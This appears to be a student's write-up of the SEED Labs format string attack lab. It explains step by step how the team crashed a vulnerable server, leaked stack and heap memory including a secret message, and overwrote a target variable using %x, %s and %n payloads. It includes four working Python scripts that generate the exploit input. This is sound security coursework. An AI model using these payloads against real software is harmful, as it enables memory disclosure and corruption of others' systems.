# SEED Labs – Format String Attack Lab


## Task 1: Crashing the Program

During the assigned task, we were tasked with sending an input to the server to intentionally crash it. To achieve this, we opted for a straightforward payload, using `%s`. The program crashed as a result of the `printf` function attempting to print a string by referencing an invalid heap address. Consequently, the program terminated due to the invalid memory access without crashing the server because the program runs in a child process spawnedby the server program.

## Task 2: Printing Out the Server Program’s Memory

### Task 2.A: Stack Data

In this task we were asked to discover how many %x where needed to print out the first 4 bytes. To do that we used the "buildstring.py" provided to us and modified so that the buffer sent would have the first 4 bytes to be 0xaabbccdd to make it easier to find it and also 100 * "%.8x" to print the address until the first four bytes.

```python
#!/usr/bin/python3
import sys

N = 1500
content = bytearray(0x0 for i in range(N))

number  = 0xaabbccdd
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%.8x-"*100

fmt  = (s).encode('latin-1')
content[4:8+len(fmt)] = fmt

with open('badfile', 'wb') as f:
  f.write(content)
```


After getting the response from the server we only countent backwards to get the exact number, and discover the number to be 64. So to get to the first 4 bytes it was necessary to used 64 %x.

![Output do Servidor](/images/64Xs.png)

### Task 2.B: Heap Data

In this assignment, our objective is to leverage the previously acquired information. Specifically, we aim to utilize the first four bytes of the buffer to store the address of a valid heap pointer. This pointer, in turn, directs us to a string containing the secret message. To do that we used this code: 

```python
#!/usr/bin/python3
import sys

N = 1500
content = bytearray(0x0 for i in range(N))

number  = 0x080b4008
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%.8x-"*63 + "%s"

fmt  = (s).encode('latin-1')
content[4:8+len(fmt)] = fmt

with open('badfile', 'wb') as f:
  f.write(content)
```

With this code we managed to get the secret message:
![Secret Message](/images/secret_message.png)

## Task 3: Modifying the Server Program’s Memory

### Task 3.A: Change the value to a different value
In the context of this task, our goal is to manipulate the value of a variable. To accomplish this, we utilize a potentially perilous string formatter. Unlike traditional formatters that solely facilitate the retrieval of values from the stack, the formatter "%n" goes a step further by allowing the insertion of a value into a specific address on the stack. While "%n" typically serves to tally the number of characters written by `printf`, its use in this scenario poses a risk, as it can be exploited to alter values within the stack.

Building upon our existing knowledge, a straightforward modification involves encoding the target stack address in the initial four bytes of the buffer. Subsequently, at the previously identified position, we insert the "%n" formatter. This strategic manipulation capitalizes on the formatter's ability to write the count of bytes written so far, transforming it from a benign character count mechanism into a mechanism for modifying stack values.
Used code: 

```python
#!/usr/bin/python3
import sys

N = 1500
content = bytearray(0x0 for i in range(N))

number  = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%.8x-"*63 + "%n"

fmt  = (s).encode('latin-1')
content[4:8+len(fmt)] = fmt

with open('badfile', 'wb') as f:
  f.write(content)
```

With this code we managed to modify the targets value:
![Target_variable_new_value](/images/target_variable.png)

### Task 3.B: Change the value to 0x5000
Achieving a targeted value alteration requires a slightly more intricate approach. This can be accomplished by increasing the number of characters to be printed by `printf`. Utilizing the precision modifier, as employed previously, allows us to display a significantly larger number of characters through `printf`. To calculate the necessary increment, we subtract the last acquired value (0x23b in our case, obtained solely by printing memory) from the desired value of 0x5000.

Used code:
```python
#!/usr/bin/python3
import sys

N = 1500
content = bytearray(0x0 for i in range(N))

number  = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%.8x-"*62 + "%.19918x" +"%n"

fmt  = (s).encode('latin-1')
content[4:+len(fmt)] = fmt

with open('badfile', 'wb') as f:
  f.write(content)
```

![Target_variable_set_to_5000](/images/target0X5000.png)